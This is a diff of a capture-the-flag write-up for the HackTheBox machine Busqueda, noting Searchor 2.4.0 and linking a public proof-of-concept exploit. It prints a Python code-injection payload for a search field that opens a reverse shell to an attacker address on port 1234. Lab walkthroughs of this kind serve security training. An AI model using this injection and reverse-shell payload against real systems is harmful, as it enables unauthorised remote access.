@@ -21,9 +21,13 @@
 
 • it is noticed at the bottom of the web page a version Searchor 2.4.0, let's try to find the exploit for it 
 
+
 after searching on Google, it is found that the URL: https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit- have the exploit code to receive an initial shell 
 
+
 • put the exploit on the filed   
+
+
 ', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.144',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
 
 ![image](https://github.com/MohamedKhaled7/Busqueda---HackTheBox/assets/58820314/c6a5eca0-9522-4ef1-a94b-590f602d7429)
